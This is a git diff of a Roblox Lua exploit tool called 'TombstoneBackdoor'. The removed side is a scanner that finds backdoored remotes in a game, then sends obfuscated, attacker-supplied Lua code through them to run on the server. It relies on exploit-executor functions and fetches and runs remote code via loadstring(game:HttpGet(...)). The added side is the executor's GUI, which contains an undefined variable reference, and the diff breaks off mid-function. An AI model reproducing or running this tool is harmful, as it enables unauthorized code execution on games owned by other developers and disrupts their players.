@@ -1,602 +1,997 @@
--- services
-local httpService = game:GetService("HttpService")
-local insertService = game:GetService("InsertService")
-local logService = game:GetService("LogService")
-local runService = game:GetService("RunService")
-local starterGui = game:GetService("StarterGui")
--- imports
-local base91 = loadstring(game:HttpGet("https://raw.githubusercontent.com/Dekkonot/base91-luau/main/src/init.lua"))()
--- variables
-local config
-local executorAPI
-local debugSource = [[local function main() %s end;local a=table.create(512)local b=function(...)local c={...}for d,e in pairs(c)do c[d]=tostring(e)or"nil"end;return c end;local f,g;do local h=getfenv()local i,j=print,warn;h.print,h.warn=function(...)table.insert(a,{0,workspace:GetServerTimeNow(),select("#",...),b(...)})end,function(...)table.insert(a,{1,workspace:GetServerTimeNow(),select("#",...),b(...)})end;f,g=pcall(setfenv(main,h))h.print,h.warn=i,j end;local k=Instance.new("BoolValue")k.Name,k.Value,k.Parent="%s",f,game:GetService("InsertService")k:SetAttribute("stderr",not f and g or nil)k:SetAttribute("stdout",#a>0 and game:GetService("HttpService"):JSONEncode(a)or nil)task.delay(60,k.Destroy,k)]]
-local sourcePayload = [[local a,b,c,d=game:GetService("LogService"),game.SetAttribute,task.delay,"%s";b(a,d,"%s");c(5,b,a,d,nil)]]
-local stringList = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!#$%&()*+,./:;<=>?@[]^_`{|}~'"
-local payloadList = table.create(20)
-local CONSTANTS = {
-	CONFIG_URL = "https://raw.githubusercontent.com/jLn0n/beckdeer-skenner/main/src/default-config.lua",
-	FOLDER_NAME = "beckdeer-skenner"
+-- Gui to Lua
+
+-- Version: 3.2
+
+-- Instances:
+
+local CryoFlux = Instance.new("ScreenGui")
+
+local LoadScreen = Instance.new("Frame")
+
+local LoadTitle = Instance.new("TextLabel")
+
+local LoadStatus = Instance.new("TextLabel")
+
+local Main = Instance.new("Frame")
+
+local Shadow = Instance.new("ImageLabel")
+
+local NavBar = Instance.new("Frame")
+
+local Title = Instance.new("TextLabel")
+
+local ToggleBtn = Instance.new("TextButton")
+
+local TabButtons = Instance.new("Frame")
+
+local ExecutorTab = Instance.new("TextButton")
+
+local ScriptsTab = Instance.new("TextButton")
+
+local SettingsTab = Instance.new("TextButton")
+
+local CreditsTab = Instance.new("TextButton")
+
+local Pages = Instance.new("Frame")
+
+local ExecutorPage = Instance.new("Frame")
+
+local EditorFrame = Instance.new("Frame")
+
+local LineNumbers = Instance.new("TextLabel")
+
+local Editor = Instance.new("TextBox")
+
+local ExecuteBtn = Instance.new("TextButton")
+
+local ClearBtn = Instance.new("TextButton")
+
+local StatusBar = Instance.new("Frame")
+
+local StatusText = Instance.new("TextLabel")
+
+local ScriptsPage = Instance.new("Frame")
+
+local SearchBox = Instance.new("TextBox")
+
+local ScriptList = Instance.new("ScrollingFrame")
+
+local ExampleScript1 = Instance.new("TextButton")
+
+local ExampleScript2 = Instance.new("TextButton")
+
+local ExampleScript3 = Instance.new("TextButton")
+
+local SettingsPage = Instance.new("Frame")
+
+local CloseBtn = Instance.new("TextButton")
+
+local ThemeBtn = Instance.new("TextButton")
+
+local CreditsPage = Instance.new("Frame")
+
+local CreditsText = Instance.new("TextLabel")
+
+local UICorner = Instance.new("UICorner")
+
+local UIGradient = Instance.new("UIGradient")
+
+-- Properties:
+
+CryoFlux.Name = "TombstoneBackdoor"
+
+CryoFlux.Parent = game:GetService("CoreGui")
+
+CryoFlux.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Tela de Carregamento
+
+LoadScreen.Name = "LoadScreen"
+
+LoadScreen.Parent = CryoFlux
+
+LoadScreen.BackgroundColor3 = Color3.fromRGB(15, 18, 25)
+
+LoadScreen.BorderSizePixel = 0
+
+LoadScreen.Position = UDim2.new(0.3, 0, 0.3, 0)
+
+LoadScreen.Size = UDim2.new(0, 500, 0, 350)
+
+LoadScreen.ZIndex = 2
+
+LoadTitle.Name = "LoadTitle"
+
+LoadTitle.Parent = LoadScreen
+
+LoadTitle.BackgroundTransparency = 1
+
+LoadTitle.Position = UDim2.new(0, 0, 0.4, 0)
+
+LoadTitle.Size = UDim2.new(1, 0, 0, 50)
+
+LoadTitle.Font = Enum.Font.GothamBold
+
+LoadTitle.Text = "Welcome to TombstoneBackdoor! Injecting.."
+
+LoadTitle.TextColor3 = Color3.fromRGB(100, 200, 255)
+
+LoadTitle.TextSize = 24
+
+LoadStatus.Name = "LoadStatus"
+
+LoadStatus.Parent = LoadScreen
+
+LoadStatus.BackgroundTransparency = 1
+
+LoadStatus.Position = UDim2.new(0, 0, 0.5, 0)
+
+LoadStatus.Size = UDim2.new(1, 0, 0, 30)
+
+LoadStatus.Font = Enum.Font.Gotham
+
+LoadStatus.Text = "Checking backdoor..."
+
+LoadStatus.TextColor3 = Color3.fromRGB(180, 200, 220)
+
+LoadStatus.TextSize = 14
+
+Main.Name = "Main"
+
+Main.Parent = Tombstone
+
+Main.BackgroundColor3 = Color3.fromRGB(25, 28, 36)
+
+Main.BorderSizePixel = 0
+
+Main.Position = UDim2.new(0.3, 0, 0.3, 0)
+
+Main.Size = UDim2.new(0, 500, 0, 350)
+
+Main.Active = true
+
+Main.Draggable = true
+
+Main.Visible = false
+
+Shadow.Name = "Shadow"
+
+Shadow.Parent = Main
+
+Shadow.AnchorPoint = Vector2.new(0.5, 0.5)
+
+Shadow.BackgroundTransparency = 1
+
+Shadow.Position = UDim2.new(0.5, 0, 0.5, 5)
+
+Shadow.Size = UDim2.new(1, 10, 1, 10)
+
+Shadow.ZIndex = -1
+
+Shadow.Image = "rbxassetid://1316045217"
+
+Shadow.ImageColor3 = Color3.fromRGB(0, 100, 150)
+
+Shadow.ImageTransparency = 0.8
+
+Shadow.ScaleType = Enum.ScaleType.Slice
+
+Shadow.SliceCenter = Rect.new(10, 10, 118, 118)
+
+NavBar.Name = "NavBar"
+
+NavBar.Parent = Main
+
+NavBar.BackgroundColor3 = Color3.fromRGB(30, 33, 42)
+
+NavBar.BorderSizePixel = 0
+
+NavBar.Size = UDim2.new(1, 0, 0, 40)
+
+Title.Name = "Title"
+
+Title.Parent = NavBar
+
+Title.BackgroundTransparency = 1
+
+Title.Position = UDim2.new(0, 15, 0, 0)
+
+Title.Size = UDim2.new(0, 200, 1, 0)
+
+Title.Font = Enum.Font.GothamBold
+
+Title.Text = "Tombstone backdoor"
+
+Title.TextColor3 = Color3.fromRGB(100, 200, 255)
+
+Title.TextSize = 14
+
+Title.TextXAlignment = Enum.TextXAlignment.Left
+
+ToggleBtn.Name = "ToggleBtn"
+
+ToggleBtn.Parent = NavBar
+
+ToggleBtn.BackgroundTransparency = 1
+
+ToggleBtn.Position = UDim2.new(1, -40, 0, 0)
+
+ToggleBtn.Size = UDim2.new(0, 40, 1, 0)
+
+ToggleBtn.Font = Enum.Font.GothamBold
+
+ToggleBtn.Text = "-"
+
+ToggleBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
+
+ToggleBtn.TextSize = 18
+
+TabButtons.Name = "TabButtons"
+
+TabButtons.Parent = Main
+
+TabButtons.BackgroundColor3 = Color3.fromRGB(25, 28, 36)
+
+TabButtons.BorderSizePixel = 0
+
+TabButtons.Position = UDim2.new(0, 0, 0, 40)
+
+TabButtons.Size = UDim2.new(0, 120, 0, 310)
+
+ExecutorTab.Name = "ExecutorTab"
+
+ExecutorTab.Parent = TabButtons
+
+ExecutorTab.BackgroundColor3 = Color3.fromRGB(35, 120, 150)
+
+ExecutorTab.BorderSizePixel = 0
+
+ExecutorTab.Position = UDim2.new(0, 0, 0, 10)
+
+ExecutorTab.Size = UDim2.new(1, 0, 0, 30)
+
+ExecutorTab.Font = Enum.Font.GothamMedium
+
+ExecutorTab.Text = "Executor"
+
+ExecutorTab.TextColor3 = Color3.fromRGB(220, 240, 255)
+
+ExecutorTab.TextSize = 12
+
+ScriptsTab.Name = "ScriptsTab"
+
+ScriptsTab.Parent = TabButtons
+
+ScriptsTab.BackgroundColor3 = Color3.fromRGB(25, 28, 36)
+
+ScriptsTab.BorderSizePixel = 0
+
+ScriptsTab.Position = UDim2.new(0, 0, 0, 50)
+
+ScriptsTab.Size = UDim2.new(1, 0, 0, 30)
+
+ScriptsTab.Font = Enum.Font.GothamMedium
+
+ScriptsTab.Text = "Scripts(soon)"
+
+ScriptsTab.TextColor3 = Color3.fromRGB(180, 200, 220)
+
+ScriptsTab.TextSize = 12
+
+SettingsTab.Name = "SettingsTab"
+
+SettingsTab.Parent = TabButtons
+
+SettingsTab.BackgroundColor3 = Color3.fromRGB(25, 28, 36)
+
+SettingsTab.BorderSizePixel = 0
+
+SettingsTab.Position = UDim2.new(0, 0, 0, 90)
+
+SettingsTab.Size = UDim2.new(1, 0, 0, 30)
+
+SettingsTab.Font = Enum.Font.GothamMedium
+
+SettingsTab.Text = "Settings"
+
+SettingsTab.TextColor3 = Color3.fromRGB(180, 200, 220)
+
+SettingsTab.TextSize = 12
+
+CreditsTab.Name = "CreditsTab"
+
+CreditsTab.Parent = TabButtons
+
+CreditsTab.BackgroundColor3 = Color3.fromRGB(25, 28, 36)
+
+CreditsTab.BorderSizePixel = 0
+
+CreditsTab.Position = UDim2.new(0, 0, 0, 130)
+
+CreditsTab.Size = UDim2.new(1, 0, 0, 30)
+
+CreditsTab.Font = Enum.Font.GothamMedium
+
+CreditsTab.Text = "Credits"
+
+CreditsTab.TextColor3 = Color3.fromRGB(180, 200, 220)
+
+CreditsTab.TextSize = 12
+
+Pages.Name = "Pages"
+
+Pages.Parent = Main
+
+Pages.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+
+Pages.BackgroundTransparency = 1
+
+Pages.BorderSizePixel = 0
+
+Pages.Position = UDim2.new(0, 120, 0, 40)
+
+Pages.Size = UDim2.new(0, 380, 0, 310)
+
+-- Executor Page
+
+ExecutorPage.Name = "ExecutorPage"
+
+ExecutorPage.Parent = Pages
+
+ExecutorPage.BackgroundColor3 = Color3.fromRGB(20, 23, 30)
+
+ExecutorPage.BorderSizePixel = 0
+
+ExecutorPage.Size = UDim2.new(1, 0, 1, 0)
+
+EditorFrame.Name = "EditorFrame"
+
+EditorFrame.Parent = ExecutorPage
+
+EditorFrame.BackgroundColor3 = Color3.fromRGB(15, 18, 25)
+
+EditorFrame.BorderSizePixel = 0
+
+EditorFrame.Position = UDim2.new(0, 10, 0, 10)
+
+EditorFrame.Size = UDim2.new(1, -20, 1, -60)
+
+LineNumbers.Name = "LineNumbers"
+
+LineNumbers.Parent = EditorFrame
+
+LineNumbers.BackgroundColor3 = Color3.fromRGB(15, 18, 25)
+
+LineNumbers.BorderSizePixel = 0
+
+LineNumbers.Position = UDim2.new(0, 0, 0, 0)
+
+LineNumbers.Size = UDim2.new(0, 30, 1, 0)
+
+LineNumbers.Font = Enum.Font.Code
+
+LineNumbers.Text = "1"
+
+LineNumbers.TextColor3 = Color3.fromRGB(100, 150, 180)
+
+LineNumbers.TextSize = 14
+
+LineNumbers.TextXAlignment = Enum.TextXAlignment.Right
+
+LineNumbers.TextYAlignment = Enum.TextYAlignment.Top
+
+Editor.Name = "Editor"
+
+Editor.Parent = EditorFrame
+
+Editor.BackgroundColor3 = Color3.fromRGB(15, 18, 25)
+
+Editor.BorderSizePixel = 0
+
+Editor.Position = UDim2.new(0, 35, 0, 0)
+
+Editor.Size = UDim2.new(1, -35, 1, 0)
+
+Editor.ClearTextOnFocus = false
+
+Editor.Font = Enum.Font.Code
+
+Editor.MultiLine = true
+
+Editor.Text = "-- Welcome to CryoFlux!"
+
+Editor.TextColor3 = Color3.fromRGB(220, 240, 255)
+
+Editor.TextSize = 14
+
+Editor.TextXAlignment = Enum.TextXAlignment.Left
+
+Editor.TextYAlignment = Enum.TextYAlignment.Top
+
+ExecuteBtn.Name = "ExecuteBtn"
+
+ExecuteBtn.Parent = ExecutorPage
+
+ExecuteBtn.BackgroundColor3 = Color3.fromRGB(40, 150, 180)
+
+ExecuteBtn.BorderSizePixel = 0
+
+ExecuteBtn.Position = UDim2.new(0, 10, 1, -40)
+
+ExecuteBtn.Size = UDim2.new(0, 120, 0, 30)
+
+ExecuteBtn.Font = Enum.Font.GothamBold
+
+ExecuteBtn.Text = "EXECUTE"
+
+ExecuteBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+ExecuteBtn.TextSize = 12
+
+ClearBtn.Name = "ClearBtn"
+
+ClearBtn.Parent = ExecutorPage
+
+ClearBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+
+ClearBtn.BorderSizePixel = 0
+
+ClearBtn.Position = UDim2.new(0, 140, 1, -40)
+
+ClearBtn.Size = UDim2.new(0, 120, 0, 30)
+
+ClearBtn.Font = Enum.Font.GothamBold
+
+ClearBtn.Text = "CLEAR"
+
+ClearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+ClearBtn.TextSize = 12
+
+StatusBar.Name = "StatusBar"
+
+StatusBar.Parent = ExecutorPage
+
+StatusBar.BackgroundColor3 = Color3.fromRGB(30, 33, 42)
+
+StatusBar.BorderSizePixel = 0
+
+StatusBar.Position = UDim2.new(0, 0, 1, -5)
+
+StatusBar.Size = UDim2.new(1, 0, 0, 5)
+
+StatusText.Name = "StatusText"
+
+StatusText.Parent = StatusBar
+
+StatusText.BackgroundTransparency = 1
+
+StatusText.Size = UDim2.new(1, -10, 1, 0)
+
+StatusText.Font = Enum.Font.Gotham
+
+StatusText.Text = "Ready"
+
+StatusText.TextColor3 = Color3.fromRGB(100, 200, 255)
+
+StatusText.TextSize = 10
+
+StatusText.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Scripts Page
+
+ScriptsPage.Name = "ScriptsPage"
+
+ScriptsPage.Parent = Pages
+
+ScriptsPage.BackgroundColor3 = Color3.fromRGB(20, 23, 30)
+
+ScriptsPage.BorderSizePixel = 0
+
+ScriptsPage.Size = UDim2.new(1, 0, 1, 0)
+
+ScriptsPage.Visible = false
+
+SearchBox.Name = "SearchBox"
+
+SearchBox.Parent = ScriptsPage
+
+SearchBox.BackgroundColor3 = Color3.fromRGB(30, 33, 42)
+
+SearchBox.BorderSizePixel = 0
+
+SearchBox.Position = UDim2.new(0, 10, 0, 10)
+
+SearchBox.Size = UDim2.new(1, -20, 0, 30)
+
+SearchBox.Font = Enum.Font.Gotham
+
+SearchBox.PlaceholderText = "Search scripts..."
+
+SearchBox.Text = ""
+
+SearchBox.TextColor3 = Color3.fromRGB(220, 240, 255)
+
+SearchBox.TextSize = 12
+
+ScriptList.Name = "ScriptList"
+
+ScriptList.Parent = ScriptsPage
+
+ScriptList.BackgroundColor3 = Color3.fromRGB(15, 18, 25)
+
+ScriptList.BorderSizePixel = 0
+
+ScriptList.Position = UDim2.new(0, 10, 0, 50)
+
+ScriptList.Size = UDim2.new(1, -20, 1, -60)
+
+ScriptList.ScrollBarThickness = 5
+
+ScriptList.CanvasSize = UDim2.new(0, 0, 0, 300)
+
+ExampleScript1.Name = "ExampleScript1"
+
+ExampleScript1.Parent = ScriptList
+
+ExampleScript1.BackgroundColor3 = Color3.fromRGB(25, 28, 36)
+
+ExampleScript1.BorderSizePixel = 0
+
+ExampleScript1.Position = UDim2.new(0, 0, 0, 10)
+
+ExampleScript1.Size = UDim2.new(1, 0, 0, 30)
+
+ExampleScript1.Font = Enum.Font.Gotham
+
+ExampleScript1.Text = "Soon"
+
+ExampleScript1.TextColor3 = Color3.fromRGB(220, 240, 255)
+
+ExampleScript1.TextSize = 12
+
+ExampleScript2.Name = "ExampleScript2"
+
+ExampleScript2.Parent = ScriptList
+
+ExampleScript2.BackgroundColor3 = Color3.fromRGB(25, 28, 36)
+
+ExampleScript2.BorderSizePixel = 0
+
+ExampleScript2.Position = UDim2.new(0, 0, 0, 50)
+
+ExampleScript2.Size = UDim2.new(1, 0, 0, 30)
+
+ExampleScript2.Font = Enum.Font.Gotham
+
+ExampleScript2.Text = "Soon"
+
+ExampleScript2.TextColor3 = Color3.fromRGB(220, 240, 255)
+
+ExampleScript2.TextSize = 12
+
+ExampleScript3.Name = "ExampleScript3"
+
+ExampleScript3.Parent = ScriptList
+
+ExampleScript3.BackgroundColor3 = Color3.fromRGB(25, 28, 36)
+
+ExampleScript3.BorderSizePixel = 0
+
+ExampleScript3.Position = UDim2.new(0, 0, 0, 90)
+
+ExampleScript3.Size = UDim2.new(1, 0, 0, 30)
+
+ExampleScript3.Font = Enum.Font.Gotham
+
+ExampleScript3.Text = "Soon"
+
+ExampleScript3.TextColor3 = Color3.fromRGB(220, 240, 255)
+
+ExampleScript3.TextSize = 12
+
+-- Settings Page
+
+SettingsPage.Name = "SettingsPage"
+
+SettingsPage.Parent = Pages
+
+SettingsPage.BackgroundColor3 = Color3.fromRGB(20, 23, 30)
+
+SettingsPage.BorderSizePixel = 0
+
+SettingsPage.Size = UDim2.new(1, 0, 1, 0)
+
+SettingsPage.Visible = false
+
+CloseBtn.Name = "CloseBtn"
+
+CloseBtn.Parent = SettingsPage
+
+CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 60, 60)
+
+CloseBtn.BorderSizePixel = 0
+
+CloseBtn.Position = UDim2.new(0.5, -110, 0.3, 0)
+
+CloseBtn.Size = UDim2.new(0, 220, 0, 40)
+
+CloseBtn.Font = Enum.Font.GothamBold
+
+CloseBtn.Text = "Close"
+
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+CloseBtn.TextSize = 14
+
+ThemeBtn.Name = "ThemeBtn"
+
+ThemeBtn.Parent = SettingsPage
+
+ThemeBtn.BackgroundColor3 = Color3.fromRGB(60, 60, 80)
+
+ThemeBtn.BorderSizePixel = 0
+
+ThemeBtn.Position = UDim2.new(0.5, -110, 0.5, 0)
+
+ThemeBtn.Size = UDim2.new(0, 220, 0, 40)
+
+ThemeBtn.Font = Enum.Font.GothamBold
+
+ThemeBtn.Text = "White theme"
+
+ThemeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+ThemeBtn.TextSize = 14
+
+-- Credits Page
+
+CreditsPage.Name = "CreditsPage"
+
+CreditsPage.Parent = Pages
+
+CreditsPage.BackgroundColor3 = Color3.fromRGB(20, 23, 30)
+
+CreditsPage.BorderSizePixel = 0
+
+CreditsPage.Size = UDim2.new(1, 0, 1, 0)
+
+CreditsPage.Visible = false
+
+CreditsText.Name = "CreditsText"
+
+CreditsText.Parent = CreditsPage
+
+CreditsText.BackgroundTransparency = 1
+
+CreditsText.Position = UDim2.new(0, 20, 0, 20)
+
+CreditsText.Size = UDim2.new(1, -40, 1, -40)
+
+CreditsText.Font = Enum.Font.Gotham
+
+CreditsText.Text = "Created by TombstoneOnTop on discord;)"
+
+CreditsText.TextColor3 = Color3.fromRGB(220, 240, 255)
+
+CreditsText.TextSize = 16
+
+CreditsText.TextWrapped = true
+
+-- UI Corners
+
+UICorner.CornerRadius = UDim.new(0, 4)
+
+UICorner.Parent = Main
+
+-- Gradients
+
+UIGradient.Color = ColorSequence.new{
+
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(50, 120, 180)),
+
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 80, 140))
+
 }
-local remoteInfo = {
-	["foundBackdoor"] = false,
-	["instance"] = nil,
-	["args"] = {"source"},
-	["argSrcIndex"] = 1,
-	["srcFunc"] = nil,
-	["redirection"] = {
-		["__testver"] = false, -- using the test version might not always work, use with caution
-		["initialized"] = false,
-	}
-}
-local msgOutputs = {
-	["mainTabText"] = "--[[\n\tTombstone scanner loaded!\n\tUsing 'github.com/Tombstone' for interface.",
 
-	["attached"] = "\n Attached Remote: %s\n Type: %s\n Payload: %s",
-	["cacheLoaded"] = "Place cache of [%s] has been loaded.",
-	["printRemote"] = "\n Remote: %s | [%s]\n Type: %s",
+UIGradient.Rotation = 90
 
-	["scanMsg1"] = "Remote scanning has been started.",
-	["scanMsg2"] = "You could see the remotes being scanned in the Developer Console if config.enableLogging is set to true.",
-	["scanBenchmark"] = "Took %.2f second(s) to scan remotes.",
+UIGradient.Parent = NavBar
 
-	["cacheFailed"] = "Failed to load the backdoor cache of [%s], it might be outdated.",
-	["outdatedConfig"] = "The configuration file is outdated!\nIt is recommended to update the configuration to prevent errors.",
-	["configLoadFailed"] = "Local configuration failed to load, it might be corrupted.",
-	["noBackdoorRemote"] = "No backdoored remote(s) can be found here!",
-	["remoteRedirectLoadFailed"] = "Remote redirection failed to load, using original remote.",
-}
-local msgBoxParams = {
-	["DiscordInvitePrompt"] = {
-		Title = "Discord Invite Prompt",
-		TextContent = "Would you like to join our discord community server?",
-		ButtonCount = 2,
-	},
-	["DiscordInviteCopied"] = {
-		Title = "Discord Invite Prompt",
-		TextContent = "Copied discord server invite URL.",
-		ButtonCount = 1,
-		Button0Text = "OK"
-	}
-}
-local stringifiedTypes = {
-	EnumItem = function(value)
-		return string.format("Enum.%s.%s", value.EnumType, value.Name)
-	end,
-	CFrame = function(value)
-		return string.format("CFrame.new(%s)", tostring(value))
-	end,
-	Vector3 = function(value)
-		return string.format("Vector3.new(%s)", tostring(value))
-	end,
-	BrickColor = function(value)
-		return string.format("BrickColor.new(\"%s\")", value.Name)
-	end,
-	Color3 = function(value)
-		return string.format("Color3.new(%s)", tostring(value))
-	end,
-	string = function(value)
-		return `"{value}"`
-	end,
-	number = function(value)
-		return string.format("%2.f", value)
-	end,
-	Ray = function(value)
-		return string.format("Ray.new(Vector3.new(%s), Vector3.new(%s))", tostring(value.Origin), tostring(value.Direction))
-	end
-}
--- functions
-local get_thread_identity = (syn and syn.get_thread_identity) or getthreadidentity
-local set_thread_identity = (syn and syn.set_thread_identity) or setthreadidentity
+-- Scripts:
 
-local _getDebugIdFunc = clonefunction(game.GetDebugId)
-local function getDebugId(instanceObj)
-	local oldThreadIdentity = get_thread_identity()
-	set_thread_identity(7)
-	local debugId = _getDebugIdFunc(instanceObj)
-	set_thread_identity(oldThreadIdentity)
-	return debugId
+-- Função para atualizar números de linha
+
+local function UpdateLineNumbers()
+
+    local lineCount = 0
+
+    for _ in string.gmatch(Editor.Text, "\n") do
+
+        lineCount = lineCount + 1
+
+    end
+
+    lineCount = lineCount + 1
+
+    
+
+    local numbersText = ""
+
+    for i = 1, lineCount do
+
+        numbersText = numbersText .. tostring(i) .. "\n"
+
+    end
+
+    
+
+    LineNumbers.Text = numbersText
+
 end
 
-local function newNotification(msgText)
-	return starterGui:SetCore("SendNotification", {
-		Title = "[TheTombstone scanner loaded]",
-		Text = msgText,
-		Duration = (5 + (#msgText / 80))
-	})
+-- Configurar tabs
+
+local function SwitchTab(newTab)
+
+    ExecutorPage.Visible = false
+
+    ScriptsPage.Visible = false
+
+    SettingsPage.Visible = false
+
+    CreditsPage.Visible = false
+
+    
+
+    ExecutorTab.BackgroundColor3 = Color3.fromRGB(25, 28, 36)
+
+    ScriptsTab.BackgroundColor3 = Color3.fromRGB(25, 28, 36)
+
+    SettingsTab.BackgroundColor3 = Color3.fromRGB(25, 28, 36)
+
+    CreditsTab.BackgroundColor3 = Color3.fromRGB(25, 28, 36)
+
+    
+
+    newTab.BackgroundColor3 = Color3.fromRGB(35, 120, 150)
+
+    
+
+    if newTab == ExecutorTab then
+
+        ExecutorPage.Visible = true
+
+    elseif newTab == ScriptsTab then
+
+        ScriptsPage.Visible = true
+
+    elseif newTab == SettingsTab then
+
+        SettingsPage.Visible = true
+
+    elseif newTab == CreditsTab then
+
+        CreditsPage.Visible = true
+
+    end
+
 end
 
-local function logToConsole(logType: "print" | "warn", ...)
-	if not config.enableLogging then return end
-	local logFunc = (
-		if logType == "print" then
-			print
-		elseif logType == "warn" then
-			warn
-		else print
-	)
-
-	return logFunc(...)
-end
-
-local function getFullNameOf(object)
-	if not object then return end
-	local currentInstance = object
-	local result = ""
-
-	while currentInstance ~= game do
-		local currentName = (if currentInstance then currentInstance.Name else nil)
-		if not currentName then break end
-
-		local concatenatedStr = (
-			if (not string.match(currentName, "^[%w_]+$")) then
-				`["{currentName}"]`
-			else `.{currentName}`
-		)
-		result = concatenatedStr .. result
-		currentInstance = currentInstance.Parent
-	end
-	result = string.sub(result, 2)
-	return result
-end
-
-local function pathToInstance(strPath)
-	if not strPath then return end
-	local subPaths do
-		subPaths = table.create(0)
-
-		for matchedStr in string.gmatch(strPath, "[^%.]+") do -- TODO: handle ServerScriptService[\"Test 1\"][\"Test 2\"]
-			local subPath1 = string.gsub(matchedStr, "(.+)%[\"(.-)\"%]", "%1")
-			local subPath2 = string.gsub(matchedStr, "(.+)%[\"(.-)\"%]", "%2")
-
-			table.insert(subPaths, subPath1)
-			if (subPath1 == subPath2 and matchedStr == subPath1) then continue end
-			table.insert(subPaths, subPath2)
-		end
-	end
-	local result = game
-
-	for _, pathName in subPaths do
-		if not result then return end
-		result = result:WaitForChild(pathName, 1)
-	end
-	return result
-end
-
-local function mergeArray(t1, t2)
-	t1 = table.clone(t1)
-
-	for index, value in t2 do
-		value = (if typeof(value) == "table" then table.clone(value) else value)
-		table.insert(t1, value)
-	end
-	return t1
-end
-
-local function generateRandString(lenght, lettersOnly)
-	local result = ""
-	local strTotalLenght = (if lettersOnly then 52 else #stringList)
-
-	for _ = 1, lenght do
-		local randInteger = math.random(1, strTotalLenght)
-		result ..= string.sub(stringList, randInteger, randInteger)
-	end
-	return result
-end
-
-local function notSameRandNumber(min, max, ...)
-	local numIndexes = {...}
-	local randNumber = math.random(min, max)
-
-	task.defer(table.clear, numIndexes) -- optimization!?!!?
-	return (
-		if not table.find(numIndexes, randNumber) then
-			randNumber
-		else notSameRandNumber(min, max, ...)
-	)
-end
-
-local function waitUntil(waitTime, condition)
-	local startTime = os.clock()
-	repeat runService.Heartbeat:Wait() until condition() or (os.clock() - startTime) > waitTime
-end
-
-local function isRemoteAllowed(object)
-	if not (typeof(object) == "Instance" and (object:IsA("RemoteEvent") or object:IsA("RemoteFunction"))) then
-		return false
-	end
-
-	for filterName, filterFunc in config.remoteFilters do
-		if filterFunc and not filterFunc(object) then continue end
-		return false
-	end
-	return true
-end
-
-local function getRemotes()
-	local remotes = table.create(128)
-	local instancesList = mergeArray(
-		game:GetDescendants(),
-		(if getinstances then getinstances() else {})
-	)
-
-	for _, object in instancesList do
-		if not isRemoteAllowed(object) then continue end
-		local remoteObjId = getDebugId(object)
-		remotes[remoteObjId] = object
-	end
-	return remotes
-end
-
-local function getStringifiedType(value)
-	local stringifier = stringifiedTypes[typeof(value)]
-
-	return (
-		if stringifier then
-			stringifier(value)
-		else tostring(value)
-	)
-end
-
-local function applyMacros(source)
-	for macroName, macroValue in config.scriptMacros do
-		macroValue = getStringifiedType(
-			if typeof(macroValue) == "function" then
-				macroValue(macroValue)
-			else macroValue
-		)
-		source = string.gsub(source, `%%{macroName}%%`, macroValue)
-	end
-	return source
-end
-
-local function getRemoteFunc(remoteObj)
-	return (
-		if remoteObj:IsA("RemoteEvent") then
-			remoteObj.FireServer
-		elseif remoteObj:IsA("RemoteFunction") then
-			remoteObj.InvokeServer
-		else nil
-	)
-end
-
-local applyRedirectedRemoteSecurity do
-	local userId = game:GetService("Players").LocalPlayer.UserId
-
-	-- simple XOR encryption algorithm, nothing special
-	local function XORSource(source: string, key: number): string
-		local randomObj = Random.new(key)
-		local result = ""
-		local randX, randY, randZ =
-			randomObj:NextInteger(0, 128),
-			randomObj:NextInteger(0, 96),
-			randomObj:NextInteger(0, 32)
-
-		for idx = 1, #source do
-			local charByte = string.byte(source, idx, idx)
-			local offset = ((idx % randomObj:NextInteger(0, randX)) + randomObj:NextInteger(0, randY))
-			charByte = bit32.bxor(offset, charByte, randomObj:NextInteger(0, randZ))
-
-			result ..= string.char(charByte)
-		end
-		result = string.gsub(result, ".", function(value) return string.format("%02X", string.byte(value)) end)
-		return result
-	end
-
-	function applyRedirectedRemoteSecurity(source)
-		if not config.redirectRemote then return end
-		local argsLenght = math.random(12, 32)
-		local generatedArgs = table.create(argsLenght)
-		local verificationIdx = math.random(4, (argsLenght - 1))
-		local srcArgIdx = notSameRandNumber(2, (argsLenght - 2), verificationIdx)
-		local randIdx = notSameRandNumber(2, (argsLenght - 3), srcArgIdx, verificationIdx)
-		local nonceIdx = notSameRandNumber(2, (argsLenght - 3), srcArgIdx, verificationIdx, randIdx)
-		local nonceOffset = Random.new((argsLenght / verificationIdx) % (verificationIdx * 2)):NextInteger(8, argsLenght)
-		local XORKey = math.ceil(((((argsLenght / randIdx) % verificationIdx) * nonceIdx) * (userId * srcArgIdx)) * nonceOffset)
-
-		generatedArgs[1] = (
-			if (math.random(1, 2) == 2) then
-				generateRandString(verificationIdx)
-			else verificationIdx
-		)
-		generatedArgs[verificationIdx] = true -- sets a boolean at idx `verificationIdx`
-		generatedArgs[srcArgIdx] = base91.encodeString(XORSource(source, XORKey))
-		generatedArgs[randIdx] = srcArgIdx -- sets the value `srcArgIdx` to `randIdx`
-		generatedArgs[nonceIdx] = `\127@{generateRandString(randIdx + nonceOffset)}` -- generates a nonce that is the lenght of `randIdx`
-
-		for argIndex = 2, argsLenght do -- inserts random jibberish
-			if typeof(generatedArgs[argIndex]) ~= "nil" then continue end
-			local valueType = math.random(1, 3)
-
-			generatedArgs[argIndex] = (
-				if valueType == 1 then
-					generateRandString(math.random(12, 512))
-				elseif valueType == 2 then
-					math.random(0, 0x7fffffff)
-				elseif valueType == 3 then
-					math.random(1, 10) > 5
-				else nil
-			)
-		end
-		return generatedArgs
-	end
-end
-
-local function execScript(source, noRedirectOutput)
-	if not remoteInfo.foundBackdoor then return end
-	source = applyMacros(source)
-	local remoteFunc = getRemoteFunc(remoteInfo.instance)
-	local remoteArgs = table.clone(remoteInfo.args)
-
-	if (config.redirectOutput and not noRedirectOutput) then
-		local nonce = generateRandString(32)
-		source = string.format(debugSource, source, nonce)
-
-		local connection
